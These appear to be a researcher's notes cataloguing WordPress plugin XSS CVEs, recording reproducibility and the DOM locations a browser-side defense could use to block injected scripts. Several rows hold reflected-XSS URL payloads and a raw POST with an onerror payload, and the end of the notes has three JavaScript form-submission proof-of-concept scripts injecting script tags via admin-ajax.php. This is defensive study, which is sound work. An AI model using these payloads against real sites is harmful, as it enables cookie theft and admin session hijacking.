U 	AO 	UO 	D 	 	 	
x	x	x	x	CVE-2018-6943	IN DOUBT
x	x	x	x	CVE-2018-6944 	IN DOUBT
x	x	x	x	CVE-2018-7280 	possible XSS on response back (missing content-type application/json header???), not evident of where response is placed on DOM.
y	n	n	n	CVE-2018-7543 	reproducible, unclear whether it is an actual attack.
				CVE-2018-7747 	
n	n	y	y	(1)				exploit1 can be intercepted on a div with id="cf-autoresponder-message-{{_id}}" (in 101:config.php)
x	x	x	x	(2)				exploit2 can't be verified, form submission not working
n	y	n	y	(3)				exploit3 can be intercepted by the following selector: #fld_29462 > h3 more information could be the caldera-editor-field-title class, and being the 									first tag after the previous id.
n	y	n	y	CVE-2018-8729	for posts with javascript in the title, no immediate identifier for element with injection, but might be enough to stop javascript from running in the 		  							"description" columns of the activity log table
n	y	n	y	CVE-2018-9020	all these unsanitized inputs have identifying ids (e.g. location-name, location-town, etc.) which could be used to stop a script running here. 											Furthermore the problem in this specific case in a JS file (events-manager.js) loaded in the header, which could potentially be modified to sanitize the 				 			     mapTitle variable before anything happens. (https://www.youtube.com/watch?v=40d7uXl36O4)
y	n	n	n	CVE-2018-9034	Blocked by chrome's XSS auditor (ERR_BLOCKED_BY_XSS_AUDITOR), Firefox doesn't block it but an extension could do so using similar techniques to chrome's.
								(more info at https://www.exploit-db.com/exploits/44366/), admin being tricked into accessing url
y	n	y	y	CVE-2018-9172	this attack injects the attack script several times inside the "upload div". Fortunately, it seems like upload functionality is broken anyway by any 									kind of injection, so it would be safe to disable everything inside the div with id='wordpress_file_upload_block'+(injected_js), e.g. for the attack I 									tried, the id looked like wordpress_file_upload_block_<script>alert('ManhNho')</script>, this id will be distinct across pages but the 													'wordpress_file_upload_block' part should not.
								(more info at https://www.exploit-db.com/exploits/44443/)
n	n	n	n	CVE-2018-9844 	skipped for now
n	y	n	y	CVE-2018-9864 	Unable to reproduce (history feature not working), however, from the  video (https://www.youtube.com/watch?v=eHG1pWaez9w), it should be easy to target 									the exploit as they happen on the admin page, which should be uniform across all sites, and has clear identifiers for the table elements (												class="chat_name column_chat_name" + id's based on element number).
y	n	n	y	CVE-2018-10102 	related to wordpress version, version string was not escaped in the get_the_generator function, and could lead to XSS in a generator tag. It sounds like 								 it would be very hard to pinpoint for an arbitrary page.
n	n	y	y	CVE-2018-10234 	not clear how the js can be injected, as it seems to be using the p tag's innerText property, need to investigate plugin code further.
n	n	y	y	CVE-2018-10300 	in here, an user (might have to have admin privileges) will modify it's instagram bio and use it to inject js into the wp instagram feed. The unique 									identifier for the place where this occurs seems to be the 'class="wdi_bio"', as well as further information that this specific page is indeed an 										instagram feed in wordpress (from other context clues).
x	x	x	x	CVE-2018-10301 	this exploit seems specific to the pro version of the 10-web instagram feed so I haven't been able to try it out.
n	n	y	y	CVE-2018-10309 	authenticated attack (admin on admin), injection occurs inside div class="rcc-panel group". trap (on scripts) seems to run before the rest of the body is 				  			   loaded. (more info at https://www.exploit-db.com/exploits/44563/)
n	y	n	y	CVE-2018-10310 	authenticated attack (admin on admin), this only occurs in the admin view, and there is enough context here to block an attack regardless of the site, 									i.e. no scripts in table class="form-table" until <p class="submit">. (more info at https://www.exploit-db.com/exploits/44503/)
n	y	n	y	CVE-2018-10371	basically the same as above,  table class="form-table" until <input name="Submit" (more info at https://www.exploit-db.com/exploits/44585/).
n	n	n	y	CVE-2018-10752 	authenticated attack (admin on admin), there's some identifiers here but probably wouldn't hold in an arbitrary page, in div with classes "tggr-tweets									type-tggr-tweets", seems to be in the title part (header) of the aticle. (more info at https://www.exploit-db.com/exploits/45225/)
n	y	n	y	CVE-2018-11105 	same as CVE-2018-9864.
y	y	n	y	CVE-2018-11366	unauthenticated attack, injection happens on admin view, i.e no code runs in table class="wp-list-table widefat fixed users" until input 												name="lz_reset_ip". (more info at https://wpvulndb.com/vulnerabilities/9088)
y	y	n	y	CVE-2018-11485	unauthenticated attack, was not able to reproduce, injection didn't seem to work, but regardless, injection happes on admin view, presumably in order 									column of table.
x	x	x	x	CVE-2018-11568	can't reproduce, this theme has to be payed for, lloks like URL attack only, blocked by chrome XSS auditor. 																			(more info https://packetstormsecurity.com/files/143666/WordPress-GamePlan-Event-And-Gym-Fitness-Theme-1.5.13.2-Cross-Site-Scripting.html)
y	n	n	n	CVE-2018-11709	URL attack on plugin, (e.g. accessing localhost/index.php/community/?%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E), blocked by chrome XSS auditor.
n	y	n	y	CVE-2018-13832 	authenticated attack (admin on admin), as before, this happens in admin view, table class="form-table", until p class="submit".
y	n	n	n	CVE-2018-14430	unclear if this is self-xss, or will run on admin view, more investigation needed. 																										(more info at https://hackpuntes.com/cve-2018-14430-wordpress-plugin-multi-step-form-125-multiples-xss-reflejados/#comment-902)
y	n	n	n	CVE-2018-16285	costs money to use, but essentially looks like a POST request causes injected code in the request to run, not sure if anything can be done about this one
								(e.g. 
								post /wp-admin/admin-ajax.php
								Host domain.com
								action=userpro_shortcode_template&shortcode=[userpro<img src=a onerror=alert(1)> id=1 layout="float" collage_per_page="20" emd_paginate_top="1" emd_paginate="1" emd_gender="Gender,radi)
								(more info at https://risataim.blogspot.com/2018/09/xss-en-plugin-userpro-de-wordpress.html)

				https://packetstormsecurity.com/files/149603/SYSS-2018-014.txt
				https://wpvulndb.com/

				Most of the information recorded here applies for <script> tags, as the 'beforescriptexecute' event works well with those. However, for things like images with 'onerror','onload',etc. and other elements, should be able to use proxies or other event rewriting methods to recreate what 'beforescriptexecute' does when these properties are accessed (TODO).


EXTRA CVEs for enhanced study:

				REST OF 2018:
y	n	n	y	CVE-2018-1000556	Reflected XSS, when loading specific URL, script runs 																																	(http://[path to WordPress]/wp-admin/admin.php?page=wps_pages_page&page-uri=%3F%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E)
									This is blocked by XSS filtering, i.e Chrome's XSS auditor, but not Firefox.
n	y	n	y	CVE-2018-18460		XSS through URL (i.e https://localhost/wp-admin/admin.php?page=wplivechat-menu-gdpr-page&term=123%5C%27%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E) 									blocked by XSS filters (not Firefox). Interestingly, the content gets loaded from the DOM via the term input, but the HTML might load BEFORE the 										<input name='term' type='text' value='<?php echo($_GET['term')?> element, which makes it hard to pinpoint where the injection location starts. 											However, it might be good enough to just get rid of any script inside the <div id='wpbody-content'>. until the footer div. Otherwise, blocking it at 									 URL level should work.
				CVE-2018-18373		TODO
x	x	x	x	CVE-2018-18069		this is a paid plugin.
y	y	n	y	CVE-2018-17947		reflected XSS on admin view, should work when searching for scripts after <input name="text" placeholder="Search..." value="\" type="text"> and 										before <button class="button" type="submit">
n	y	n	y	CVE-2018-17946	    reflected XSS on admin view through $_GET req., attack can be identified at URL level, (blocked by chrome XSS auditor), several injection points but 									 should still work
n	y	n	y	CVE-2018-17884		reflected XSS on admin view through $_SERVER req. on Apache, attack can be identified at URL level, (blocked by chrome XSS auditor), one apparent 										injection point so simple approach should work
n	n	y	y	CVE-2018-17866		Admin attack on other users. The script is injected on login page through ultimate member login form. This can be modified across different 											installations of the plugin, so not much to do here, but there are DOM elements related to it.
y	n	n	y	CVE-2018-17140		There are two components here, can be an admin-on-admin attack, this is seen on the admin view of QuizLord, and the attack can be singled out in 										this scenario, i.e after <a href="localhost/wp-admin.php?page=quizlord&id=x"> and before the next <td>. It could also be admin-on-user, and the 										attack is injected through a quiz on any page or post, but it might be enough to single it out on the <div class="ql-question">  before 												<h5 class="ql-description">, however, I'm not sure if this can change with quiz format.
y	n	n	y	CVE-2018-17138		seems to be the same as above, but the plugin is no longer available (might be able to be installed manually). TODO.
				CVE-2018-16363		for some reason older versions are not available for download, might have to look into another wya of getting them. TODO.
x	x	x	x	CVE-2018-13136		no information available on POC or how to reproduce this at all.
				CVE-2018-11580		unable to reproduce, however, if attacker can create arbitrary pages and posts, not much we can do to stop that.
y	n	y	y	CVE-2018-11486		unable to reproduce, no data showing where the attack gets executed, however, it looks like it should be related to the search bar somehow, so I'm 										going to apply DOM and user-only to it.
y	y	n	y	CVE-2018-6891		unauthenticated user on admin attack, this one is triggered when the admin clicks on details in the payment item, the code is injected into a table 									which doesn't look like it should have any JS anyway.
x	x	x	x	CVE-2018-6469		This plugin was closed on February 11, 2018 and is no longer available for download. Reason: Security Issue. TODO: tag as related?
x	x	x	x	CVE-2018-6468		This plugin was closed on February 11, 2018 and is no longer available for download. Reason: Security Issue. TODO: tag as related?
x	x	x	x	CVE-2018-6466		This plugin was closed on February 11, 2018 and is no longer available for download. Reason: Security Issue. TODO: tag as related?
n	y	n	y	CVE-2018-6357		unable to reproduce, no data showing where the attack gets executed, however, it looks like it should be somewhere in the admin-view of the plugin 										settings, so i'm going to tag this one as such. it is partly CSRF, so i'm going to tag is as authenticated as well.
				CVE-2018-6194		"The plugin does not have a valid header." when installing vulnerable version, will have to look at it again. TODO.
n	y	y	y	CVE-2018-6002		URL attack, displays on DOM but URL filtering should be enough here. (chrome blocks it, firefox doesn't) (IMPORTANT: this is the most current 											version of this plugin, i.e this is live NOW)
n	y	y	y	CVE-2018-6001		URL attack, displays on DOM but URL filtering should be enough here. (chrome blocks it, firefox doesn't) (IMPORTANT: this is the most current 											version of this plugin, i.e this is live NOW)

the following where all descriptions are the same were all posted by the same person (form posting didn't seem to work in my installation? hence couldn't reproduce)
n	n	n	n	CVE-2018-5776		related to WP version, but doesn't have a POC and looks like it's not something we can cover anyway.
n	y	n	y	CVE-2018-5672		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5671		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5670		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5668		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5667		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5666		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5665		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.		
n	y	n	y	CVE-2018-5664		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5663		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5662		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5661		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5660		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5659		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5657		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5655		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5654		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5653		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
				CVE-2018-5652		TODO: can't install v 1.6 using rollback but looks very similar to the others above.
				CVE-2018-5651		TODO: can't install v 1.6 using rollback but looks very similar to the others above.
n	y	n	y	CVE-2018-5369		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.	
n	y	n	y	CVE-2018-5367		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5366		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5365		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5364		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5363		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5362		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
n	y	n	y	CVE-2018-5361		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 									specific spots in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
y	n	n	y	CVE-2018-5316		Reflected XSS as part of the URL, blocked by chrome, not firefox, the usual.
n	y	n	y	CVE-2018-5312		stored xss via at least an editor role, manifested when clicking the malicious tab, script shows up in <div id="TABS_R">. the CVE doesn't mention 										this, but the code also runs in other settings of the wp-admin page. While the code runs under similar situations, I don't know if it would always 										happen in the same location, as these pages seem to be able to change depending on which plugins are installed (such as this one). (TODO)
n	y	n	y	CVE-2018-5311		couldn't reproduce, but from the description looks like something that can be handled. stored xss via at least editor role, not sure if there is the 									 added behaviour as above as well.
y	n	n	y	CVE-2018-5293		reflected XSS on a weak parameter, this can be detected at the URL level, blocked by chrome, but not firefox.
y	n	n	y	CVE-2018-5292		reflected XSS on a weak parameter, this can be detected at the URL level, blocked by chrome, but not firefox.
y	n	n	y	CVE-2018-5288		reflected XSS on a weak parameter, this can be detected at the URL level, blocked by chrome, but not firefox.
y	n	n	y	CVE-2018-5286		reflected XSS on a weak parameter, this can be detected at the URL level, blocked by chrome, but not firefox.
				CVE-2018-5284		CSRF/XSS combo, admin must be tricked into running CSRF part before XSS. But the XSS can be handled since it only appears in the admin-view, and in 				    a specific spot in the HTML (there's 3 points: forms, extras, and themes). Couldn't reproduce.
x	x	x	x	CVE-2018-5214		plugin no longer available, closed due to "security issue" TODO: tag as related?
n	y	n	y	CVE-2018-5213		stored XSS, requires at least editor role. injection runs only on admin view.
n	n	n	y	CVE-2018-5212		stored XSS, requires at least editor role. injection runs both on admin view and user side (thumbnail parameter is displayed on user side).
				CVE-2018-0585
				CVE-2018-0578
				CVE-2018-0577
				CVE-2018-0576
				CVE-2018-0547
				CVE-2018-0546
				CVE-2017-18032
				CVE-2017-18015
				CVE-2017-18012
				CVE-2017-18011
				CVE-2017-18010
				CVE-2016-10706
				CVE-2016-10705
				CVE-2015-9273
				CVE-2015-9270
				CVE-2015-4557
				CVE-2015-2329
				CVE-2015-2324
				CVE-2014-6604
				CVE-2014-4932
				CVE-2014-2274
				CVE-2014-2297

				ALL 2017:
				CVE-2017-1002017
				CVE-2017-1002011
				CVE-2017-1000227
				CVE-2017-1000038
				CVE-2017-1000033	
				CVE-2017-17869
				CVE-2017-17780
				CVE-2017-17753
				CVE-2017-17744
				CVE-2017-17719
				CVE-2017-17451
				CVE-2017-17096
				CVE-2017-17094
				CVE-2017-17093
				CVE-2017-17092
				CVE-2017-17043
				CVE-2017-16842
				CVE-2017-16815
				CVE-2017-16758
				CVE-2017-15867
				CVE-2017-15863
				CVE-2017-15812
				CVE-2017-15811
				CVE-2017-15810
				CVE-2017-15375
				CVE-2017-14751
				CVE-2017-14726
				CVE-2017-14724
				CVE-2017-14721
				CVE-2017-14720
				CVE-2017-14718
				CVE-2017-14622
				CVE-2017-14530
				CVE-2017-14313
				CVE-2017-14126
				CVE-2017-13138
				CVE-2017-12948
				CVE-2017-12200
				CVE-2017-12131
				CVE-2017-12068
				CVE-2017-10991
				CVE-2017-9420
				CVE-2017-9337
				CVE-2017-9336
				CVE-2017-9288
				CVE-2017-9063
				CVE-2017-9061
				CVE-2017-7723
				CVE-2017-6818
				CVE-2017-6817
				CVE-2017-6814
				CVE-2017-6804
				CVE-2017-6103
				CVE-2017-6102
				CVE-2017-5942
				CVE-2017-5612
				CVE-2017-5490
				CVE-2017-5488
				CVE-2017-2216
				CVE-2016-10112
				CVE-2016-7168	
				CVE-2016-0770
				CVE-2016-0765
				CVE-2015-9233
				CVE-2015-9230
				CVE-2015-9229
				CVE-2015-8354
				CVE-2015-8353
				CVE-2015-8350
				CVE-2015-7668
				CVE-2015-7666
				CVE-2015-7667
				CVE-2015-7357
				CVE-2015-5532
				CVE-2015-5057
				CVE-2015-3998
				CVE-2015-3421
				CVE-2015-3299
				CVE-2014-9310
				CVE-2014-8758
				CVE-2014-8492
				CVE-2014-8087
				CVE-2014-7240
				CVE-2011-4955


form code for CVE-2018-11580

function post(path, params, method) {
    method = method || "post"; // Set method to post by default if not specified.
	
    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);
    var field = document.createElement("input");
    field.setAttribute("type", "text");
    field.setAttribute("name", "action");
    field.setAttribute("value", "mpc_ajax_action");
    form.appendChild(field);
    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "text");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
        }
    }
    var hiddenField = document.createElement("input");
    hiddenField.setAttribute("type", "submit");
    hiddenField.setAttribute("value", "Exploit");
    form.appendChild(hiddenField);
    document.body.appendChild(form);
    form.submit();
}
var formParams = {"prefix_word": "Test", "postfix_word": "Hack", "pages_content": "<script>alert('XSS')</script>", "excerpt_content": "Hacked...", "no_post_add": "10"};
post("http://localhost/wp-admin/admin-ajax.php", formParams, "POST");


form code for CVE-2018-11486

function post(path, params, method) {
    method = method || "post"; // Set method to post by default if not specified.
	
    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);
    var field = document.createElement("input");
    field.setAttribute("type", "text");
    field.setAttribute("name", "action");
    field.setAttribute("value", "Save_adance_search_settings_free");
    form.appendChild(field);
    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "text");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
        }
    }
    var hiddenField = document.createElement("input");
    hiddenField.setAttribute("type", "submit");
    hiddenField.setAttribute("value", "Exploit");
    form.appendChild(hiddenField);
    document.body.appendChild(form);
    form.submit();
}
var formParams = {"custom_css": "<script>alert(document.cookie)</script>"};
post("http://localhost/wp-admin/admin-ajax.php", formParams, "POST");

form code for CVE-2018-6357:

function post(path, params, method) {
    method = method || "post"; // Set method to post by default if not specified.
	
    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);
    var field = document.createElement("input");
    field.setAttribute("type", "hidden");
    field.setAttribute("name", "action");
    field.setAttribute("value", "acx_asmw_saveorder");
    form.appendChild(field);
    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "text");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
        }
    }
    var hiddenField = document.createElement("button");
    hiddenField.setAttribute("type", "submit");
    hiddenField.setAttribute("value", "Submit");
    form.appendChild(hiddenField);
    document.body.appendChild(form);
    form.submit();
}
var formParams = {"recordsArray[]": "1'><script>alert(1);</script>"};
post("http://localhost/wp-admin/admin-ajax.php", formParams, "POST");

